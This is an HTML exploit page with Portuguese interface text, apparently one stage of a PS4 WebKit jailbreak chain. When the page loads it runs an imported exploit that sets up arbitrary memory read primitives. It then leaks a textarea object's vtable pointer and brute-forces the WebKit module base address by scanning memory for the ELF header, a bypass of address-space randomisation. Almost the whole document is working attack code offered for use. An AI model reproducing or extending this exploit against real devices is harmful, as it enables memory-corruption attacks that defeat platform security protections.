
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PS4 WebKit — Base via VTable[0] (Final)</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; background: #0b0f19; color: #c8ced8;
    font: 13px/1.5 "Segoe UI", system-ui, sans-serif;
    display: flex; flex-direction: column; align-items: center;
    gap: 10px; padding: 14px; }
  h1 { color: #fff; font-size: 16px; }
  #status { font-size: 14px; font-weight: 700; color: #fff; text-align: center; }
  #leaks { background: #111827; border: 1px solid #1f2937; border-radius: 8px;
    padding: 12px; width: 95%; max-width: 700px; font-family: monospace; font-size: 12px; }
  .leak-row { display: flex; justify-content: space-between; padding: 3px 0;
    border-bottom: 1px solid #1f2937; }
  .leak-row:last-child { border-bottom: none; }
  .label { color: #9ca3af; } .value { color: #60a5fa; font-weight: bold; }
  #log { width: 95%; max-width: 700px; height: 150px; background: #111827;
    border: 1px solid #1f2937; border-radius: 8px; padding: 8px;
    overflow-y: auto; font-family: monospace; font-size: 11px; color: #9fb1c3; }
  #log .ok { color: #4ade80; } #log .err { color: #f87171; }
  #log .found { color: #a78bfa; font-weight: bold; }
  #controls { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; }
  .ctrl-btn { padding: 10px 18px; border-radius: 6px; border: none;
    background: #1e40af; color: #fff; cursor: pointer; font-size: 13px; font-weight: 600; }
  .ctrl-btn:hover { background: #2563eb; }
  .ctrl-btn:disabled { background: #374151; opacity: 0.5; cursor: not-allowed; }
  .ctrl-btn.success { background: #15803d; }
  .ctrl-btn.success:hover { background: #16a34a; }
  input { background: #111827; border: 1px solid #374151; color: #fff;
    padding: 8px 12px; border-radius: 5px; font-family: monospace; font-size: 13px; width: 160px; }
  input:focus { outline: none; border-color: #60a5fa; }
  .note { background: #1f2937; border-left: 3px solid #fbbf24; padding: 8px 12px;
    border-radius: 0 6px 6px 0; font-size: 11px; color: #d1d5db; max-width: 700px; }
</style>
</head>
<body>
<h1>PS4 WebKit — Base via VTable[0] (Final)</h1>
<div id="status">Inicializando...</div>

<div id="leaks">
  <div class="leak-row"><span class="label">vtable[0]:</span><span class="value" id="l-vt0">---</span></div>
  <div class="leak-row"><span class="label">base (PS5 offset):</span><span class="value" id="l-base">---</span></div>
  <div class="leak-row"><span class="label">resultado:</span><span class="value" id="l-res">---</span></div>
</div>

<div class="note">
  <b>Descoberta:</b> No PS4, __ps5NativeCtor NAO esta no WebKit (diff ~39MB do vtable[0]).<br>
  Use apenas vtable[0]! Offset PS5: 0x285170. Base estimada: vtable[0] - 0x285170.
</div>

<div id="controls">
  <button class="ctrl-btn success" id="btnAuto" onclick="autoFindBase()">🔎 Auto Find Base</button>
  <button class="ctrl-btn" id="btnTest" onclick="testCustomOffset()">Testar Offset</button>
  <input type="text" id="offInput" placeholder="ex: 0x285170" value="0x285170">
  <button class="ctrl-btn" onclick="clearLog()">Limpar</button>
</div>

<div id="log"></div>

<script type="module">
  import { establishPrimitive } from "./resources/core.js";
  import { installWindowP } from "./resources/mem.js";
  import { int64 } from "./resources/int64.js";

  const status = document.getElementById("status");
  const logBox = document.getElementById("log");
  const btnAuto = document.getElementById("btnAuto");
  const btnTest = document.getElementById("btnTest");

  function log(msg, cls) {
    const line = document.createElement("div");
    line.className = cls || "info";
    line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
    logBox.appendChild(line);
    logBox.scrollTop = logBox.scrollHeight;
    while (logBox.children.length > 20) logBox.removeChild(logBox.firstChild);
  }
  window.clearLog = function() { logBox.innerHTML = ""; };

  let vtable0 = null;

  function readVtable0() {
    const p = window.p;
    if (!p) return null;
    try {
      let textArea = document.createElement("textarea");
      let objAddr = p.leakval(textArea);
      let vtPtr = p.read8(objAddr.add32(0x18));
      let vt0 = p.read8(vtPtr);
      vtable0 = vt0;
      document.getElementById("l-vt0").textContent = "0x" + vt0.toString(16);
      return vt0;
    } catch (e) { log("Erro ao ler vtable: " + e.message, "err"); return null; }
  }

  window.testCustomOffset = function() {
    const p = window.p;
    if (!p) { log("window.p nao disponivel!", "err"); return; }
    if (!vtable0) { vtable0 = readVtable0(); if (!vtable0) return; }

    const input = document.getElementById("offInput").value.trim();
    let off = parseInt(input, 16);
    if (isNaN(off) || off <= 0) { log("Offset invalido", "err"); return; }

    let base = vtable0.sub32(off);
    let baseNum = base.hi * 0x100000000 + base.low;
    document.getElementById("l-base").textContent = "0x" + base.toString(16);
    log("Testando offset 0x" + off.toString(16) + " => base 0x" + base.toString(16), "warn");

    try {
      let magic = p.read4(base);
      let magicHex = "0x" + magic.toString(16).padStart(8, "0");
      log("Magic: " + magicHex, magicHex === "0x464c457f" ? "found" : "info");

      if (magicHex === "0x464c457f") {
        log("✅ BASE ENCONTRADA!", "found");
        document.getElementById("l-res").textContent = "✅ ELF FOUND";
        document.getElementById("l-res").style.color = "#4ade80";
        window.__webkitBase = base;
        status.textContent = "Base: 0x" + base.toString(16);
        status.style.color = "#4ade80";
        return true;
      } else {
        document.getElementById("l-res").textContent = "❌ " + magicHex;
        document.getElementById("l-res").style.color = "#f87171";
      }
    } catch (e) {
      log("FALHA: " + e.name + ": " + e.message, "err");
      document.getElementById("l-res").textContent = "❌ CRASH";
      document.getElementById("l-res").style.color = "#f87171";
    }
    return false;
  };

  window.autoFindBase = async function() {
    const p = window.p;
    if (!p) { log("window.p nao disponivel!", "err"); return; }
    if (!vtable0) { vtable0 = readVtable0(); if (!vtable0) return; }

    btnAuto.disabled = true; btnTest.disabled = true;
    log("=== AUTO FIND BASE ===", "warn");
    log("vtable[0] = 0x" + vtable0.toString(16), "info");

    // 1. Testar offset do PS5 primeiro
    const ps5Offset = 0x285170;
    log("Tentando offset PS5 (0x" + ps5Offset.toString(16) + ")...", "info");
    document.getElementById("offInput").value = "0x" + ps5Offset.toString(16);
    if (window.testCustomOffset()) { btnAuto.disabled = false; btnTest.disabled = false; return; }

    // 2. Brute force com passo 0x4000 (16KB), faixa 0x1000 a 0x5000000
    log("Iniciando brute force...", "warn");
    const startOff = 0x1000;
    const endOff = 0x5000000;
    const step = 0x4000;
    let tested = 0;

    for (let off = startOff; off <= endOff; off += step) {
      let base = vtable0.sub32(off);
      let baseNum = base.hi * 0x100000000 + base.low;
      if (baseNum < 0x800000000 || baseNum >= 0x900000000) continue;
      tested++;

      try {
        let magic = p.read4(base);
        if (magic === 0x464c457f) {
          log("✅✅✅ BASE ENCONTRADA!", "found");
          log("offset = 0x" + off.toString(16), "ok");
          log("base = 0x" + base.toString(16), "ok");
          document.getElementById("offInput").value = "0x" + off.toString(16);
          document.getElementById("l-base").textContent = "0x" + base.toString(16);
          document.getElementById("l-res").textContent = "✅ ELF FOUND";
          document.getElementById("l-res").style.color = "#4ade80";
          window.__webkitBase = base;
          status.textContent = "Base: 0x" + base.toString(16);
          status.style.color = "#4ade80";
          btnAuto.disabled = false; btnTest.disabled = false;
          return;
        }
      } catch (e) {}

      // Log a cada 512 tentativas (~8MB de progresso)
      if (tested % 512 === 0) {
        log("Progresso: tested=" + tested + " off=0x" + off.toString(16), "info");
        await new Promise(r => setTimeout(r, 1));
      }
    }

    log("Nenhuma base encontrada. Tested=" + tested, "err");
    btnAuto.disabled = false; btnTest.disabled = false;
  };

  // BOOTSTRAP
  log("Carregando...", "ok");
  status.textContent = "Executando exploit...";
  establishPrimitive({ onEvent: (tag, detail) => log(tag + ": " + detail, "info") })
    .then(carrier => {
      const prim = installWindowP(carrier, { onEvent: (tag, detail) => log(tag + ": " + detail, "info"), promote: true });
      window.__carrier = carrier; window.__prim = prim; window.p = prim; window.int64 = int64;
      log("Exploit pronto!", "ok");

      // Auto-read vtable
      let vt0 = readVtable0();
      if (vt0) {
        log("vtable[0] = 0x" + vt0.toString(16), "ok");
        // Pre-calcular base com offset PS5
        let baseEst = vt0.sub32(0x285170);
        document.getElementById("l-base").textContent = "0x" + baseEst.toString(16) + " (estimada)";
      }

      status.textContent = "Pronto — clique em Auto Find Base";
      status.style.color = "#60a5fa";
    })
    .catch(err => { log("FALHA: " + err.name + ": " + err.message, "err"); status.textContent = "Falha"; status.style.color = "#f87171"; });
</script>
</body>
</html>
